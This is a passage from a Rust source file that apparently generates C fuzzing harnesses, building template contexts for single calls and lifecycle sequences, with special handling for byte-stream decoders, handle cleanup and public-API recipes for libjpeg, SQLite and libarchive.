         ({stride_type})_gf_image_stride : ({stride_type})gf_i32(&Cur)"
    );
}

fn build_c_context(args: &GenerateCDirectArgs) -> Result<CTemplateContext, HarnessGenError> {
    validate_c_build_inputs(args)?;
    let (
        compile_flags,
        c_compiler,
        compiler_is_gcc,
        build_context_provenance,
        build_context_dropped,
    ) = split_c_compile_context(&args.compile_flags);
    let registry = TypeRegistry::from_defs(args.type_defs.iter());
    // A byte-stream decoder is driven one byte at a time: the first parameter is
    // the untrusted byte (the loop variable), and only parameters 2..N are
    // decoded/backed.
    let byte_stream = is_c_byte_stream_decoder(&args.target.name, &args.params);
    let decoder_params: &[CParameter] = if byte_stream {
        &args.params[1..]
    } else {
        &args.params
    };
    let header_complete = header_complete_aggregate_spellings(&args.type_defs);
    // #468: NUL-terminate a const input buffer only when the function exposes a
    // NUL-terminated-mode enum flag (checked over the FULL param list).
    let nul_terminate = function_selects_nul_terminated_mode(&args.params, &args.type_defs);
    let mut params = build_param_decoders(
        decoder_params,
        &registry,
        &args.lifecycle,
        Some(&header_complete),
        nul_terminate,
        args.target.variadic,
        args.decoder_limits,
        &args.target.name,
        args.force,
    )?;

    // Some decode-into APIs expose an output pointer, its capacity, and row
    // stride as three separate parameters even though all three are derived
    // from dimensions in the encoded input. Independent fuzz scalars make a
    // coherent output surface vanishingly rare. For the declaration-stable
    // WebP interleaved family, use its public metadata probe to derive bounded
    // geometry exactly as a maintained caller does. This is deliberately
    // signature- and symbol-gated; planar YUV needs a different multi-plane
    // allocation model and remains on the generic decoder.
    bind_webp_interleaved_output_geometry(
        &args.target.name,
        decoder_params,
        &registry,
        &mut params,
    );

    // Strip storage/calling-convention/decoration noise off the return type so a
    // `<type> R = ...` result capture is valid (`__vectorcall`, `SIMDJSON_INLINE`).
    let return_type = crate::c_decoders::strip_type_decoration(args.return_type.trim());
    let return_type_present = !return_type.is_empty() && !c_return_is_void(&return_type);
    // A destructor-only lifecycle on an aggregate out-parameter means the
    // callee constructs the object on success (POSIX regcomp/regfree is the
    // canonical contract). The scratch decoder names these objects `_gf_out_*`.
    // Release them only after a conventional zero-success status so malformed
    // inputs never send an unconstructed object to its destructor.
    if return_type_present && c_type_is_status_int(&return_type) {
        for (source_param, emission) in decoder_params.iter().zip(params.iter_mut()) {
            if emission.free.is_some() || !emission.arg.starts_with("&_gf_out_") {
                continue;
            }
            let Some(base) = registry.pointer_base_spelling(&source_param.c_type) else {
                continue;
            };
            let key = crate::c_decoders::normalize_handle_key(base.trim());
            let Some(delete) = args
                .lifecycle
                .iter()
                .find(|entry| {
                    entry.init.is_none()
                        && !entry.init_returns_handle
                        && crate::c_decoders::normalize_handle_key(&entry.handle_type) == key
                })
                .and_then(|entry| entry.delete.as_deref())
            else {
                continue;
            };
            emission.free = Some(format!("if (R == 0) {delete}({})", emission.arg));
        }
    }
    // §26.4: a target whose RESULT type is an incomplete (forward-declared,
    // body-less) struct/union returned BY VALUE cannot be harnessed — the
    // generated `<IncompleteType> R = target(...);` is rejected with "variable has
    // incomplete type" (stb `stb_cfg` aka `struct stb_cfg_st`, `stb_threadqueue`).
    // Skip it cleanly with a precise reason rather than emitting an uncompilable
    // harness. A POINTER result is fine (pointers to incomplete types are legal),
    // as is a type the registry never modeled (it may be complete in a header we
    // did not parse) — `resolves_to_incomplete_aggregate` returns None for both.
    if return_type_present {
        if let Some(incomplete) = registry.resolves_to_incomplete_aggregate(&return_type) {
            return Err(HarnessGenError::UnsupportedParamType(format!(
                "target '{}' returns the incomplete type '{}' by value (forward-declared, no \
                 full definition visible in the harness translation unit); a result variable of \
                 that type cannot be declared, so the target is skipped",
                args.target.name, incomplete
            )));
        }
    }
    let passthrough_libfuzzer_entrypoint = args.target.name == "LLVMFuzzerTestOneInput";

    // A drive loop only makes sense when the target returns a handle (`R`); the
    // destroy is folded into the `if (R)` block, so the separate result_cleanup
    // is dropped to avoid destroying the handle twice (or destroying a NULL).
    let drive_plan = return_type_present
        .then_some(args.drive_plan.as_ref())
        .flatten();
    let drive_steps: Vec<CDriveStepEmission> = drive_plan
        .map(|plan| {
            plan.steps
                .iter()
                .map(|s| CDriveStepEmission {
                    name: s.name.clone(),
                    breaks_on_null: s.breaks_on_null,
                })
                .collect()
        })
        .unwrap_or_default();
    let drive_destroy = drive_plan.and_then(|plan| plan.destroy.clone());

    // Campaign #10/#sds: a target returning a lifecycle handle must release the
    // live return value. For a self-returning builder (`sdscatlen(sds s, ...)`)
    // this also suppresses the stale consumed-param free; for a constructor
    // (`sdsnewlen(...) -> sds`) there is no handle param to suppress, but dropping
    // `R` still leaks every successful input. Only fire when the returned handle
    // has a KNOWN destructor in the lifecycle table (so a borrowing return like
    // strchr's interior pointer — which is never a lifecycle handle — is never
    // invalid-freed), and not when a drive loop already destroys `R`.
    let handle_return_cleanup: Option<String> =
        if return_type_present && drive_plan.is_none() && !return_type.contains('*') {
            let bare_ret = crate::c_decoders::normalize_handle_key(return_type.trim());
            args.lifecycle
                .iter()
                .find(|e| {
                    e.init_returns_handle
                        && e.delete.is_some()
                        && crate::c_decoders::normalize_handle_key(&e.handle_type) == bare_ret
                })
                .and_then(|entry| {
                    // Suppress the (now-stale) free of every consumed param of
                    // the returned handle type; the live handle is `R`, freed
                    // below. Constructors have no same-handle param, but still
                    // own the returned handle.
                    let mut saw_same_handle_param = false;
                    let mut suppressed_consumed_param_free = false;
                    for p in params.iter_mut() {
                        if crate::c_decoders::normalize_handle_key(p.c_type.trim()) == bare_ret {
                            saw_same_handle_param = true;
                            if p.free.is_some() {
                                p.free = None;
                                suppressed_consumed_param_free = true;
                            }
                        }
                    }
                    (!saw_same_handle_param || suppressed_consumed_param_free)
                        .then(|| entry.delete.as_deref().map(|d| format!("if (R) {d}(R)")))
                        .flatten()
                })
        } else {
            None
        };

    let result_cleanup = if drive_plan.is_some() {
        None
    } else if handle_return_cleanup.is_some() {
        handle_return_cleanup
    } else {
        args.result_cleanup.clone()
    };

    Ok(CTemplateContext {
        harness_id: args.harness_id.clone(),
        qualified_target_name: args.target.name.clone(),
        target_includes: args.target_includes.clone(),
        target_includes_dirs: args
            .target_includes_dirs
            .iter()
            .map(|p| crate::build_safety::make_path(p))
            .collect(),
        target_sources: args
            .target_sources
            .iter()
            .map(|p| crate::build_safety::make_path(p))
            .collect(),
        compile_flags,
        build_context_provenance,
        build_context_dropped,
        c_compiler,
        compiler_is_gcc,
        c_runtime_include: crate::build_safety::make_path(&args.c_runtime_include),
        emit_forward_declaration: !args.target_declared_in_header,
        // When the target's header is INCLUDED (not forward-declared), a callback
        // param's support re-`typedef`s the callback type the header already
        // declares — a redefinition conflict if the signatures differ. Drop our
        // typedef and use the header's (the trampoline assignment is cast, so a
        // signature mismatch still compiles).
        params: if args.target_declared_in_header {
            params
                .into_iter()
                .map(strip_redundant_callback_typedef)
                .collect()
        } else {
            params
        },
        return_type: if return_type_present {
            return_type
        } else {
            "void".to_owned()
        },
        return_type_present,
        result_cleanup,
        passthrough_libfuzzer_entrypoint,
        byte_stream,
        drive_steps,
        drive_destroy,
        drive_cap: DRIVE_LOOP_CAP,
    })
}

/// A byte-stream decoder: a `parse`/`decode`-named function whose FIRST parameter
/// is a single untrusted byte scalar (`uint8_t`/`unsigned char`/`char`) that the
/// real driver feeds one byte at a time from a stream (PX4 st24_decode,
/// sumd_decode). Such a function cannot be exercised by a single fuzzed call —
/// the deeper protocol states are only reached after a sequence of bytes — so the
/// harness must replay the whole fuzz input through it byte-by-byte.
fn is_c_byte_stream_decoder(name: &str, params: &[CParameter]) -> bool {
    let Some(first) = params.first() else {
        return false;
    };
    let t = first
        .c_type
        .to_ascii_lowercase()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ");
    if t.contains('*') || t.contains('&') {
        return false;
    }
    let t = t.trim_start_matches("const ").trim();
    let is_byte = matches!(
        t,
        "uint8_t" | "int8_t" | "unsigned char" | "signed char" | "char" | "u8" | "std::uint8_t"
    );
    let lower = name.to_ascii_lowercase();
    let parser = [
        "parse",
        "decode",
        "consume",
        "feed",
        "push_byte",
        "rx",
        "scan",
    ]
    .iter()
    .any(|kw| lower.contains(kw));
    is_byte && parser
}

fn build_c_sequence_context(
    args: &GenerateCSequenceArgs,
) -> Result<CSequenceTemplateContext, HarnessGenError> {
    validate_c_sequence_build_inputs(args)?;
    let (
        compile_flags,
        c_compiler,
        compiler_is_gcc,
        build_context_provenance,
        build_context_dropped,
    ) = split_c_compile_context(&args.compile_flags);
    let expert_jpeg_decompress = is_exact_libjpeg_header_reader(args);
    let expert_sqlite_prepare = is_exact_sqlite_prepare(args);
    if expert_jpeg_decompress || expert_sqlite_prepare {
        let mut target_includes = if expert_jpeg_decompress {
            // The target implementation includes private controller headers such
            // as jdmaster.h whose structs are intentionally incomplete outside
            // their owning translation units. An expert harness uses only the
            // stable public API, and carrying those private headers forward can
            // make even that public harness ill-formed.
            Vec::new()
        } else {
            args.target_includes.clone()
        };
        // Auto mode can identify the exact public symbol before its dependency
        // closure has promoted jpeglib.h to a direct include.  The fixed recipe
        // uses only that public API, so make the required public header explicit
        // instead of falling back to synthesizing libjpeg's private controller
        // structs from the implementation translation unit.
        if expert_jpeg_decompress
            && !target_includes.iter().any(|header| {
                Path::new(header)
                    .file_name()
                    .is_some_and(|name| name == "jpeglib.h")
            })
        {
            target_includes.push("jpeglib.h".to_owned());
        }
        return Ok(CSequenceTemplateContext {
            harness_id: args.harness_id.clone(),
            target_includes,
            target_includes_dirs: args
                .target_includes_dirs
                .iter()
                .map(|p| crate::build_safety::make_path(p))
                .collect(),
            target_sources: args
                .target_sources
                .iter()
                .map(|p| crate::build_safety::make_path(p))
                .collect(),
            compile_flags,
            build_context_provenance,
            build_context_dropped,
            c_compiler,
            compiler_is_gcc,
            c_runtime_include: crate::build_safety::make_path(&args.c_runtime_include),
            emit_forward_declaration: false,
            expert_jpeg_decompress,
            expert_sqlite_prepare,
            handle_type: String::new(),
            handle_param_type: String::new(),
            handle_value_type: String::new(),
            init_returns_handle: false,
            init_out_handle: false,
            handle_is_pointer_value: false,
            init_step: None,
            guard_op_loop_on_init: false,
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            op_steps: Vec::new(),
            op_step_max: 0,
            op_max_steps: 0,
            op_ctrl_len: 0,
            thread_slots: Vec::new(),
            derives_handle: false,
            configure_steps: Vec::new(),
            mined_protocol_steps: Vec::new(),
            mined_protocol_allows_random: false,
            mined_protocol_declarations: Vec::new(),
            mined_protocol_objects: Vec::new(),
            protocol_portfolio_lanes: 1,
            callback_actions: Vec::new(),
            expert_stream_pump: None,
            expert_output_drain: None,
            end_step: None,
        });
    }
    if args.op_steps.is_empty() {
        return Err(HarnessGenError::UnsupportedParamType(
            "C sequence harness requires at least one lifecycle operation".to_owned(),
        ));
    }
    let registry = TypeRegistry::from_defs(args.type_defs.iter());
    // An in-place sequence stack-allocates `{handle_type} _gf_handle;` and drives
    // the lifecycle through `&_gf_handle`, which REQUIRES a complete handle type.
    // A returning lifecycle stores the constructor's opaque pointer value instead
    // and deliberately does not require the pointee definition. When the in-place
    // handle's struct is merely forward-declared in the harness's headers — its body
    // lives only in a non-included `.c`, e.g. tidwall/hashmap.c's `struct hashmap`
    // (`hashmap_new` needs caller-supplied hash/compare function pointers, so it is
    // unconstructible) — that declaration is an illegal "variable has incomplete
    // type". The registry resolves such a handle to `Opaque`; SKIP cleanly instead
    // of emitting an un-compilable harness that fails the build.
    let handle_is_pointer_value =
        args.init_returns_handle || args.init_out_handle_argument.is_some();
    if !handle_is_pointer_value
        && matches!(registry.resolve(&args.handle_type), TypeShape::Opaque(_))
    {
        return Err(HarnessGenError::UnsupportedParamType(format!(
            "C sequence handle '{}' is incomplete in the harness's included headers \
             (its full definition is visible only in a non-included source); cannot \
             stack-allocate it — skipping",
            args.handle_type
        )));
    }
    let handle_field_initializers = if handle_is_pointer_value {
        Vec::new()
    } else {
        let declared_fields = match registry.resolve(&args.handle_type) {
            TypeShape::Struct { fields, .. } | TypeShape::Union { fields, .. } => fields,
            _ => Vec::new(),
        };
        args.handle_field_initializers
            .iter()
            .filter(|initializer| {
                safe_c_protocol_constant(&initializer.value)
                    && declared_fields.iter().any(|field| {
                        field.name == initializer.field
                            && matches!(
                                &field.shape,
                                TypeShape::Scalar(_)
                                    | TypeShape::Enum { .. }
                                    | TypeShape::Pointer(_)
                            )
                    })
            })
            .cloned()
            .collect()
    };
    let mut init_step = args
        .init_step
        .as_ref()
        .map(|step| {
            if args.init_returns_handle {
                build_c_returning_init_emission(
                    step,
                    "_gf_init_result",
                    &registry,
                    args.decoder_limits,
                )
            } else if let Some(output_argument) = args.init_out_handle_argument {
                build_c_out_handle_init_emission(step, output_argument, "_gf_init_result")
            } else {
                build_c_sequence_step_emission(
                    step,
                    "_gf_init",
                    "_gf_init_result",
                    &registry,
                    args.decoder_limits,
                    true,
                )
            }
        })
        .transpose()?;
    if handle_is_pointer_value && init_step.is_none() {
        return Err(HarnessGenError::UnsupportedParamType(
            "C returning-handle sequence requires a constructor".to_owned(),
        ));
    }
    // The selected target is the baseline operation and must occupy slot zero.
    // Short bootstrap seeds do not yet contain the 41-byte control block; the
    // template deliberately executes slot zero once for them so every campaign
    // reaches the requested endpoint before structure-aware mutation grows a
    // full sequence program.
    // Configuration is emitted once from stable storage below and is not also a
    // selectable op. Repeating a setter with a case-local allocated user-data
    // pointer would leave the library holding freed memory after the case exits;
    // it also wastes scarce sequence slots on setup an expert performs once.
    let mut ordered_op_specs = args
        .op_steps
        .iter()
        .filter(|step| step.role != CStepRole::Configure)
        .cloned()
        .collect::<Vec<_>>();
    if let Some(index) = ordered_op_specs
        .iter()
        .position(|step| step.name == args.target.name)
    {
        let target_step = ordered_op_specs.remove(index);
        ordered_op_specs.insert(0, target_step);
    }
    let mut op_steps = Vec::new();
    for (index, step) in ordered_op_specs.iter().enumerate() {
        match build_c_sequence_step_emission(
            step,
            &format!("_gf_step{index}"),
            &format!("_gf_step{index}_result"),
            &registry,
            args.decoder_limits,
            step.role == CStepRole::Open,
        ) {
            Ok(emission) => op_steps.push(emission),
            Err(error) if index > 0 => {
                eprintln!(
                    "warning: skipping C lifecycle operation '{}' with unsupported parameters: {error}",
                    step.name
                );
            }
            Err(error) => return Err(error),
        }
    }
    if op_steps.is_empty() {
        return Err(HarnessGenError::UnsupportedParamType(
            "C sequence harness requires at least one decodable lifecycle operation".to_owned(),
        ));
    }
    let mut end_step = args
        .end_step
        .as_ref()
        .map(|step| {
            build_c_sequence_step_emission(
                step,
                "_gf_end",
                "_gf_end_result",
                &registry,
                args.decoder_limits,
                false,
            )
        })
        .transpose()?;

    // Result threading. An op's RETURN value can be the argument a later op
    // needs — `id = add(x); remove(id); get(id)`, `p = alloc(); use(p)`. Without
    // it every argument is decoded fresh from the input and no value produced by
    // the sequence is ever consumed by it, which puts the whole handle/id
    // threading bug class out of reach by construction.
    let thread_slots = thread_slots_for(&op_steps, &ordered_op_specs);
    apply_result_threading(&mut op_steps, &ordered_op_specs, &thread_slots);

    if handle_is_pointer_value {
        for step in &mut op_steps {
            step.receiver = "_gf_handle".to_owned();
        }
    }

    // Derived objects. An op can take the live handle and return a NEW one
    // derived from it — libexpat's
    // `XML_ExternalEntityParserCreate(parentParser, ...)` builds a child parser
    // from a still-live parent, and driving that child is worth more measured
    // coverage on expat than any other single technique. Without it the harness
    // only ever drives the one object it constructed, and the entire subsystem
    // reachable through a derived object is unreachable.
    let handle_value_type = if handle_is_pointer_value {
        emit_c_type(&args.handle_type)
    } else {
        format!("{} *", emit_c_type(&args.handle_type))
    };
    let mut derives_handle =
        mark_derived_handle_producers(&mut op_steps, &handle_value_type, handle_is_pointer_value);

    // Configuration runs ONCE, unconditionally, between construction and use —
    // the step every expert harness performs and a fuzzed op program only
    // performs by luck. Emitted with its own variable prefix so it can coexist
    // with the same op still being selectable inside the loop.
    let mut configure_steps = Vec::new();
    let exact_libarchive_reader = is_exact_libarchive_reader_open(&args.target.name);
    for (index, step) in args
        .op_steps
        .iter()
        .filter(|step| {
            if step.role != CStepRole::Configure {
                return false;
            }
            // The fixed reader pump mirrors libarchive's maintained fuzz
            // harness. Once every filter and format is enabled, an unrelated
            // value-taking setter (notably archive_read_set_format with a
            // random `int`) can only narrow/disable that surface or fail. Keep
            // the two proven aggregate setup calls and omit speculative setup
            // from this exact protocol.
            !exact_libarchive_reader
                || matches!(
                    step.name.as_str(),
                    "archive_read_support_filter_all" | "archive_read_support_format_all"
                )
        })
        .enumerate()
    {
        if let Ok(mut emission) = build_c_sequence_step_emission(
            step,
            &format!("_gf_cfg{index}"),
            &format!("_gf_cfg{index}_result"),
            &registry,
            args.decoder_limits,
            false,
        ) {
            if handle_is_pointer_value {
                emission.receiver = "_gf_handle".to_owned();
            }
            if args.receiver_configuration_names.contains(&step.name) {
                if let Some(context_index) = step.params.iter().position(|param| {
                    let c_type = emit_c_type(&param.c_type);
                    c_type.trim().ends_with('*') && !c_type.contains("(*")
                }) {
                    let param = &mut emission.params[context_index];
                    param.support = None;
                    param.decl.clear();
                    param.arg = emission.receiver.clone();
                    param.free = None;
                    emission.callback_context_arg = Some(context_index);
                }
            }
            configure_steps.push(emission);
        }
    }

    // Reproduce high-confidence call protocols mined from maintained project
    // fuzzers/tests. Unlike the random op program this keeps repetitions and
    // stable flags (`parse(..., 0)` then `parse(..., 1)`) intact. Every call was
    // already declaration/type checked by the CLI; codegen independently
    // validates argument counts and literal syntax before emitting it.
    let mut mined_protocol_steps = Vec::new();
    let mut protocol_supported = true;
    for (index, observed) in args.protocol_steps.iter().enumerate() {
        match build_c_protocol_step_emission(
            observed,
            &format!("_gf_protocol{index}"),
            &format!("_gf_protocol{index}_result"),
            &registry,
            args.decoder_limits,
            if handle_is_pointer_value {
                "_gf_handle"
            } else {
                "&_gf_handle"
            },
            &mined_protocol_steps,
        ) {
            Ok(emission) => mined_protocol_steps.push(emission),
            Err(error) => {
                eprintln!(
                    "warning: ignoring mined C protocol because '{}' cannot be emitted safely: {error}",
                    observed.step.name
                );
                protocol_supported = false;
                break;
            }
        }
    }
    if !protocol_supported
        || mined_protocol_steps.len() < 2
        || !mined_protocol_steps.iter().any(|step| step.marks_target)
    {
        mined_protocol_steps.clear();
    }
    let mined_protocol_allows_random = mined_protocol_steps.last().is_some_and(|step| {
        let lower = step.name.to_ascii_lowercase();
        lower.contains("reset") || lower.contains("reinit") || lower.contains("reinitialize")
    });
    let mut mined_protocol_declarations = Vec::new();
    for step in &mined_protocol_steps {
        if !mined_protocol_declarations
            .iter()
            .any(|decl: &CSequenceStepEmission| decl.name == step.name)
        {
            mined_protocol_declarations.push(step.clone());
        }
    }
    let mut mined_protocol_objects = Vec::new();
    if !mined_protocol_steps.is_empty() && end_step.is_some() {
        for (object_index, object) in args.protocol_objects.iter().enumerate() {
            let built = (|| -> Result<CProtocolObjectEmission, HarnessGenError> {
                if object.constructor.params.len() != object.args.len() {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "mined constructor '{}' has {} argument recipes for {} parameters",
                        object.constructor.name,
                        object.args.len(),
                        object.constructor.params.len()
                    )));
                }
                let handle_name = format!("_gf_protocol_object{object_index}");
                let decoder_constructor =
                    decoder_safe_protocol_step(&object.constructor, &object.args);
                let mut constructor = build_c_sequence_step_emission(
                    &decoder_constructor,
                    &format!("_gf_object{object_index}_ctor"),
                    &handle_name,
                    &registry,
                    args.decoder_limits,
                    false,
                )?;
                if canonical_c_type(&constructor.return_type)
                    != canonical_c_type(&handle_value_type)
                {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "mined constructor '{}' returns '{}' rather than handle type '{}'",
                        object.constructor.name, constructor.return_type, handle_value_type
                    )));
                }
                constructor.receiver = if object.uses_primary_as_parent {
                    "_gf_handle".to_owned()
                } else {
                    String::new()
                };
                apply_c_protocol_args(
                    &mut constructor,
                    &object.constructor.params,
                    &object.args,
                    "_gf_handle",
                    &[],
                )?;

                let mut object_protocol = Vec::new();
                for (step_index, observed) in args.protocol_steps.iter().enumerate() {
                    let emission = build_c_protocol_step_emission(
                        observed,
                        &format!("_gf_object{object_index}_protocol{step_index}"),
                        &format!("_gf_object{object_index}_protocol{step_index}_result"),
                        &registry,
                        args.decoder_limits,
                        &handle_name,
                        &object_protocol,
                    )?;
                    object_protocol.push(emission);
                }
                let mut object_end = end_step.clone();
                if let Some(step) = &mut object_end {
                    step.receiver = handle_name.clone();
                    step.receiver_selector = None;
                }
                Ok(CProtocolObjectEmission {
                    handle_name,
                    constructor,
                    constructor_uses_parent: object.uses_primary_as_parent,
                    protocol_steps: object_protocol,
                    end_step: object_end,
                })
            })();
            match built {
                Ok(object) => mined_protocol_objects.push(object),
                Err(error) => eprintln!(
                    "warning: skipping mined protocol object '{}': {error}",
                    object.constructor.name
                ),
            }
        }
    }

    if args.target_declared_in_header {
        if let Some(step) = &mut init_step {
            strip_sequence_callback_typedefs(step);
        }
        for step in &mut op_steps {
            strip_sequence_callback_typedefs(step);
        }
        for step in &mut configure_steps {
            strip_sequence_callback_typedefs(step);
        }
        for step in &mut mined_protocol_steps {
            strip_sequence_callback_typedefs(step);
        }
        for step in &mut mined_protocol_declarations {
            strip_sequence_callback_typedefs(step);
        }
        for object in &mut mined_protocol_objects {
            strip_sequence_callback_typedefs(&mut object.constructor);
            for step in &mut object.protocol_steps {
                strip_sequence_callback_typedefs(step);
            }
            if let Some(step) = &mut object.end_step {
                strip_sequence_callback_typedefs(step);
            }
        }
        if let Some(step) = &mut end_step {
            strip_sequence_callback_typedefs(step);
        }
    }

    let mut callback_action_bound = false;
    if let Some(action) = &args.callback_action {
        if let Some(step) = &mut init_step {
            disable_sequence_callback_actions(step);
        }
        for step in &mut op_steps {
            disable_sequence_callback_actions(step);
        }
        for step in &mut mined_protocol_steps {
            disable_sequence_callback_actions(step);
        }
        for object in &mut mined_protocol_objects {
            disable_sequence_callback_actions(&mut object.constructor);
            for step in &mut object.protocol_steps {
                disable_sequence_callback_actions(step);
            }
            if let Some(step) = &mut object.end_step {
                disable_sequence_callback_actions(step);
            }
        }
        if let Some(step) = &mut end_step {
            disable_sequence_callback_actions(step);
        }
        for step in &mut configure_steps {
            for (index, param) in step.params.iter_mut().enumerate() {
                let active =
                    step.name == action.configuration_name && index == action.configuration_arg;
                callback_action_bound |= set_sequence_callback_action(param, active);
            }
        }
    }

    let expert_stream_pump = libarchive_expert_stream_pump(args, &op_steps);
    let expert_output_drain = expert_stream_pump
        .is_none()
        .then(|| output_drain_pump(args, &op_steps, &registry))
        .flatten();
    if expert_stream_pump.is_some() || expert_output_drain.is_some() {
        // The bounded libarchive pump models nested header/data loops, which a
        // flat observed trace cannot express. Keep the structurally richer
        // recipe when both sources provide evidence.
        mined_protocol_steps.clear();
        mined_protocol_declarations.clear();
        mined_protocol_objects.clear();
    }
    if !mined_protocol_steps.is_empty() && !mined_protocol_allows_random {
        // The mined branch replaces the random op program, so none of that
        // program's derived-handle producers execute. Do not emit a teardown
        // for an undeclared/nonexistent derived slot.
        derives_handle = false;
    }

    let callback_actions = callback_action_bound
        .then_some(args.callback_action.as_ref())
        .flatten()
        .map(|action| {
            std::iter::once(&action.step)
                .chain(&action.alternative_steps)
                .filter_map(|step| {
                    let mut action_args = Vec::new();
                    for (index, param) in step.params.iter().enumerate() {
                        if !matches!(
                            registry.resolve(&param.c_type),
                            TypeShape::Scalar(_) | TypeShape::Enum { .. }
                        ) {
                            eprintln!(
                    "warning: callback action '{}' ignored because parameter '{}' is not scalar",
                    step.name, param.name
                );
                            return None;
                        }
                        let c_type = emit_c_type(&param.c_type);
                        action_args.push(format!(
                            "({c_type})((_gf_callback_choice >> {}) & 1u)",
                            index % 8
                        ));
                    }
                    Some(CCallbackActionEmission {
                        name: step.name.clone(),
                        handle_param_type: emit_c_type(&args.handle_param_type),
                        args: action_args,
                    })
                })
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();

    let protocol_portfolio_lanes = if expert_stream_pump
        .as_ref()
        .is_some_and(|pump| pump.skip_step.is_some())
    {
        2
    } else if mined_protocol_objects.is_empty() {
        1
    } else {
        mined_protocol_objects.len() + 1
    };
    let op_ctrl_len = 1 + MAX_SEQUENCE_STEPS * 5 + usize::from(protocol_portfolio_lanes > 1);

    Ok(CSequenceTemplateContext {
        harness_id: args.harness_id.clone(),
        target_includes: args.target_includes.clone(),
        target_includes_dirs: args
            .target_includes_dirs
            .iter()
            .map(|p| crate::build_safety::make_path(p))
            .collect(),
        target_sources: args
            .target_sources
            .iter()
            .map(|p| crate::build_safety::make_path(p))
            .collect(),
        compile_flags,
        build_context_provenance,
        build_context_dropped,
        c_compiler,
        compiler_is_gcc,
        c_runtime_include: crate::build_safety::make_path(&args.c_runtime_include),
        emit_forward_declaration: !args.target_declared_in_header,
        expert_jpeg_decompress: false,
        expert_sqlite_prepare: false,
        handle_type: emit_c_type(&args.handle_type),
        handle_param_type: emit_c_type(&args.handle_param_type),
        handle_value_type,
        init_returns_handle: args.init_returns_handle,
        init_out_handle: args.init_out_handle_argument.is_some(),
        handle_is_pointer_value,
        guard_op_loop_on_init: init_step.as_ref().is_some_and(|s| s.is_status_return),
        init_success_nonzero: args.init_success_nonzero,
        handle_field_initializers,
        init_step,
        op_step_max: op_steps.len().saturating_sub(1),
        op_max_steps: MAX_SEQUENCE_STEPS,
        op_ctrl_len,
        thread_slots,
        derives_handle,
        configure_steps,
        mined_protocol_steps,
        mined_protocol_allows_random,
        mined_protocol_declarations,
        mined_protocol_objects,
        protocol_portfolio_lanes,
        callback_actions,
        expert_stream_pump,
        expert_output_drain,
        op_steps,
        end_step,
    })
}

/// A deliberately narrow gate for the public libjpeg decompressor state
/// machine. The globally canonical target name and exact public arity prevent
/// this fixed protocol from being applied to an unrelated function.  Header
/// discovery is deliberately not part of this gate because auto mode may select
/// the recipe before promoting transitive includes; the context adds jpeglib.h
/// explicitly. `target_declared_in_header` is also deliberately not required:
/// jpeglib.h spells the declaration as `EXTERN(int)`, which conservative source
/// parsing may not recognize even though that exact included header declares it.
fn is_exact_libjpeg_header_reader(args: &GenerateCSequenceArgs) -> bool {
    args.target.name == "jpeg_read_header" && args.target.params.len() == 2
}

/// Exact gate for SQLite's public compile/execute lifecycle. As with the
/// libjpeg recipe, this is declaration/header shaped rather than a loose name
/// heuristic, because substituting SQL VM operations into another handle API
/// would be unsound.
fn is_exact_sqlite_prepare(args: &GenerateCSequenceArgs) -> bool {
    if args.target.name != "sqlite3_prepare_v2"
        || args.target.params.len() != 5
        || !args.target_includes.iter().any(|header| {
            Path::new(header).file_name().is_some_and(|name| {
                // SQLite's canonical source-tree definition is reached through
                // sqliteInt.h, while installed/amalgamation consumers see the
                // same public declaration in sqlite3.h.
                name == "sqlite3.h" || name == "sqliteInt.h"
            })
        })
    {
        return false;
    }
    true
}

/// Build a bounded, evidence-backed pull-parser loop. The CLI has already
/// matched the target/cleanup declarations against one maintained loop;
/// codegen independently verifies that the output pointee is a complete
/// aggregate with the observed terminal field before replacing the generic
/// fuzz decoder with stable caller-owned storage.
fn output_drain_pump(
    args: &GenerateCSequenceArgs,
    op_steps: &[CSequenceStepEmission],
    registry: &TypeRegistry,
) -> Option<CExpertOutputDrain> {
    let protocol = args.output_drain_protocol.as_ref()?;
    if !safe_c_protocol_constant(&protocol.terminal_value)
        || protocol
            .terminal_field
            .chars()
            .next()
            .is_none_or(|ch| !(ch.is_ascii_alphabetic() || ch == '_'))
        || !protocol
            .terminal_field
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
    {
        return None;
    }
    let declared = args
        .op_steps
        .iter()
        .find(|step| step.name == args.target.name)?;
    let output_param = declared.params.get(protocol.output_argument)?;
    if canonical_c_type(&output_param.c_type) != canonical_c_type(&protocol.cleanup_param_type)
        || output_param
            .c_type
            .split_whitespace()
            .any(|token| token == "const")
    {
        return None;
    }
    let pointer_type = emit_c_type(&output_param.c_type);
    let pointee = pointer_base(&pointer_type)?;
    let fields = match registry.resolve(pointee) {
        TypeShape::Struct { fields, .. } | TypeShape::Union { fields, .. } => fields,
        _ => return None,
    };
    if !fields.iter().any(|field| {
        field.name == protocol.terminal_field
            && matches!(field.shape, TypeShape::Scalar(_) | TypeShape::Enum { .. })
    }) {
        return None;
    }

    let mut target_step = op_steps
        .iter()
        .find(|step| step.name == args.target.name)?
        .clone();
    if !target_step.return_type_present || protocol.output_argument >= target_step.params.len() {
        return None;
    }
    let output_value = "_gf_drain_output".to_owned();
    let output_pointer = "_gf_drain_output_ptr".to_owned();
    target_step.params[protocol.output_argument] = CParamEmission {
        support: None,
        decl: format!(
            "{pointee} {output_value}; memset(&{output_value}, 0, sizeof({output_value})); {pointer_type} {output_pointer} = &{output_value}"
        ),
        arg: output_pointer.clone(),
        c_type: pointer_type,
        free: None,
    };
    target_step.receiver = if args.init_returns_handle || args.init_out_handle_argument.is_some() {
        "_gf_handle".to_owned()
    } else {
        "&_gf_handle".to_owned()
    };
    target_step.receiver_selector = None;

    Some(CExpertOutputDrain {
        target_step,
        output_value,
        output_pointer,
        cleanup_name: protocol.cleanup_name.clone(),
        cleanup_param_type: emit_c_type(&protocol.cleanup_param_type),
        terminal_field: protocol.terminal_field.clone(),
        terminal_value: protocol.terminal_value.clone(),
        success_nonzero: protocol.success_nonzero,
        iteration_cap: 256,
    })
}

/// Recognise the public libarchive reader protocol whose call dependencies are
/// strong enough to drive without guessing:
///
/// `archive_read_open_memory` -> (`archive_read_next_header` ->
/// `archive_read_data`*)*.
///
/// This is deliberately exact rather than a broad name heuristic. Applying a
/// nested drain loop to an arbitrary `next`/`read` API could violate a library's
/// state contract and manufacture crashes. These libarchive functions have a
/// documented protocol and are also the sequence used by its maintained
